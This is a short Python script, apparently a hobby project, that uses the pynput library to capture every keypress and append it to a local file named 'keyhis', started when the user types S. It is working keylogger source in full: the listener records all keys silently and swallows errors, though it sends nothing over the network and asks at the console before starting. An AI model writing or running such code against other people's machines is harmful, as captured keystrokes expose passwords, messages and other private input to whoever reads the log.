from pynput.keyboard import Listener

def log_key(key):
    try:
        with open("keyhis","a")as f:
            f.write(f"{key}\n")
    except:
       pass
   
def keyloger():    
    try:
    
        with Listener(on_press=log_key) as a:
            a.join()
    except KeyboardInterrupt:
        print("Listener stopped by user")
    except :
        pass    
n=input("Enter S to start: ").strip().upper()

if n=='S':
    keyloger()
else:
    print("Cannot start")  
